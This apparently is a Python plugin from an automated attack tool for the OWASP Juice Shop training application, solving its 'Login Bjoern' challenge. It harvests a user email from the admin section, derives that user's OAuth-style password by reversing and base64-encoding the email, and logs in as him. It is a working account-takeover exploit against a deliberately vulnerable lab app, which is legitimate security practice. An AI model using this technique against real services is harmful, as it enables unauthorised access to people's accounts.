# SOURCE FILE:    admin_registration.py
# PROGRAM:        JuiceShop automating attack application -- Plugin
# FUNCTIONS:      Solve login BJOERN Challenge
#                 login BJOERN's account without using SQL injection, repetitive registration, etc.
#                 Decode BJOERN's password according to OAuth btoa function
#                 Finally, login BJOERN's account with correct username and password
#          
# DATE:           Dec 6, 2022
# REVISIONS:      N/A
# PROGRAMMER:     Yoyo Wang
#
# NOTES
#--------------------------------------------------------------------------------------
from plugins import attack as a
from plugins import admin_section as adSec
import base64
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#---------------------------------------------------------------------------------------
#Class: login_bjoern
#Inherit: Attack
#--------------------------------------------------------------------------------------
class login_bjoern():

#--------------------------------------------------------------------------------------
#FUNCTION: __init__ 
#ARGUMENTS: N/A
#RETURNS: void
#Description: Initial class variables
#--------------------------------------------------------------------------------------
    def __init__(self):
        # REST session
        self.juice_session = a.requests.session()
        # url for user login 
        self.url = a.URL + '/rest/user/login'
        self.set_info()

#--------------------------------------------------------------------------------------
#FUNCTION get_email
#ARGUMENTS: N/A
#RETURNS: if target's email is found return email address
#         otherwise return None
#Description: get BJOERN's email address from Admin Section
#             
#NOTES:
#--------------------------------------------------------------------------------------
    def get_email(self):
        dashboard = adSec.admin_section()
        response = dashboard.run()
        data_list = response.json()["data"]
        script = "bjoern"
        for i in range(len(data_list)):
            if script in data_list[i]["email"]:
                return data_list[i]["email"]
        #self.email = 'bjoern.kimminich@gmail.com' ### you can write a function to find this email
        return None

#--------------------------------------------------------------------------------------
#FUNCTION btoa_pass
#ARGUMENTS: N/A
#RETURNS: user password
#Description: user is using his gmail sign in which means he is using OAuth to get token
#             Decode BJOERN's password according to OAuth btoa function
#             
#NOTES:
#--------------------------------------------------------------------------------------
    def btoa_pass(self, email):
        reverse_email = email[::-1]
        password = base64.b64encode(reverse_email.encode("latin1")).decode("utf8")
        return password

#--------------------------------------------------------------------------------------
#FUNCTION btoa_pass
#ARGUMENTS: N/A
#RETURNS: N/A
#Description: Set value for class variables
#             
#NOTES:
#--------------------------------------------------------------------------------------
    def set_info(self):
        self.email = self.get_email()
        self.password = self.btoa_pass(self.email)

#--------------------------------------------------------------------------------------
#FUNCTION generator
#ARGUMENTS: N/A
#RETURNS: json_data  --> will be embedded into POST request json field. 
#Description: This function is used to generate needed data from REST requests
#             
#NOTES:
#--------------------------------------------------------------------------------------
    def generator(self,):
        json_data = {
            'email': self.email,
            'password': self.password,
        }
        return json_data

#--------------------------------------------------------------------------------------
#FUNCTION run
#ARGUMENTS: N/A
#RETURNS: N/A
#Description: This is the main function for plugin to send REST requests.
#             
#NOTES: None
#--------------------------------------------------------------------------------------
    def run(self):
        print('---------------------------------')
        print('Now let us to solve the Challenge Login Bjoern')
        json_data = self.generator()
        response = self.juice_session.post(self.url, json=json_data)
        print(response.status_code)
        if response.status_code == 200:
            a.set_auth(self.email,response)
            a.set_basket_id(self.email,response)
            a.set_password(self.email, response, self.password)
            print("we solve the Challenge login Bjoern")
        print(response.text)
        return response